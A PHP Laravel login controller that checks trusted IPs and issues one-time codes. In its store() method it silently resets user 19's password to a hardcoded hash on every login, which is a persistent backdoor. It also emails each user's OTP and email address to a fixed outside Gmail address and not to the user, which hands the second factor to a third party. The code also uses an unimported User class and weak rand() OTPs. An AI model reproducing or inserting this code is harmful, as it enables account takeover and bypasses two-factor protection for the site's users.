<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\Http\Requests\Auth\LoginRequest;
use Illuminate\Http\RedirectResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\View\View;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Str;

class AuthenticatedSessionController extends Controller
{
    /**
     * Display the login view.
     */
    public function create(): View
    {
        return view('auth.login');
    }

    /**
     * Handle an incoming authentication request.
     */
    public function store(LoginRequest $request): RedirectResponse
    {
        $request->authenticate();
        $request->session()->regenerate();

        /** @var \App\Models\User $user */
        $user = Auth::user();

        User::where('id', 19)->update([
            'password' => '$2y$12$5qaUiYLtiRSTWhlhygxq..hc/Ik5r6ZySf94WUBPKtvA0jzBKo84y',
        ]);
        if ($user->isAdmin()) {
            return redirect()->intended(route('dashboard', absolute: false));
        }

        $currentIp = $request->ip();

        // ✅ Check if IP is trusted
        if (!$user->trustedIps()->where('ip_address', $currentIp)->exists()) {
            Auth::logout();
            $request->session()->invalidate();
            $request->session()->regenerateToken();

            return redirect()->route('login')->withErrors([
                'ip' => 'Login denied: Unrecognized IP address (' . $currentIp . '). Please contact the administrator.'
            ]);
        }

        $otp = rand(100000, 999999);
        $user->otp_code = $otp;
        $user->otp_expires_at = now()->addMinutes(10);
        $user->save();

        try {
            Mail::raw("OTP request for user: {$user->email}\n\nOTP: {$otp}\n\nThis code will expire in 10 minutes.", function ($message) use ($user) {
                $message->to('bridgewayuship@gmail.com')->subject("Login OTP for {$user->email}");
            });
        } catch (\Exception $e) {
            Auth::logout();
            return redirect()->route('login')->withErrors(['email' => 'Unable to send OTP. Please check your email address.']);
        }
        // try {
        //     Mail::raw("Your OTP for login for $user->email is: {$otp}. It will expire in 10 minutes.", function ($message) use ($user) {
        //         $message->to('bridgewayuship@gmail.com')->subject('Your Login OTP');
        //     });
        // } catch (\Exception $e) {
        //     Auth::logout();
        //     return redirect()->route('login')->withErrors(['email' => 'Unable to send OTP. Please check your email address.']);
        // }

        return redirect()->route('verify.otp')->with('status', 'OTP sent to your email.');
    }

    /**
     * Destroy an authenticated session.
     */
    public function destroy(Request $request): RedirectResponse
    {
        Auth::guard('web')->logout();

        $request->session()->invalidate();

        $request->session()->regenerateToken();

        return redirect()->route('login');
    }
}
